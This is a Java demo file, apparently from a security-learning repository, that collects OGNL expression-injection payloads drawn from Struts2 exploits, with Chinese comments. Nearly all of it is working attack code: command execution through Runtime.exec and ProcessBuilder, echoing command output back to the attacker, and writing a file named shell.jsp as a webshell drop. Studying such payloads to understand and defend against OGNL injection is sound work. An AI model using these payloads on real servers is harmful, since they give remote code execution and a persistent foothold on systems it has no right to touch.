package com.pacemrc.javasec.expression.ognl;

import ognl.Ognl;
import ognl.OgnlContext;
import ognl.OgnlException;

/**
 * 从 Struts2 系列的 payload 中学习如何进行漏洞利用
 */
public class demo2 {
    public static void main(String[] args) throws OgnlException {
//         1. 命令执行
//        # Runtime
//        @java.lang.Runtime@getRuntime().exec(\"calc\")"
//        # ProcessBuilder
//        (new java.lang.ProcessBuilder(new java.lang.String[]{'calc'})).start()
//        2. 回显
//        # IOUtils
//        @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStream())
//
//        实战时可通过 response 对象回显
//        #writer = response.getWriter()
//        #writer.println("exec result")
//        #writer.flush()
//        #writer.close()

        String expression1 = "#result=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())";
        OgnlContext context1 = new OgnlContext();
        System.out.println(Ognl.getValue(expression1,context1));

//        3. 文件操作
//        单纯的命令执行无法满足需求时，可以写入 webshell
        String expression2 =
                "#filepath ='D:/tmp/',"+
                "#filename = 'shell.jsp'," +
                "#filecontent = 'pwned by caofalin'," +
                "#fos=new java.io.FileOutputStream((#filepath + #filename))," +
                "#fos.write(#filecontent.getBytes())," +
                "#fos.close()";
        OgnlContext context2 = new OgnlContext();
        Ognl.getValue(expression2,context2);
    }
}
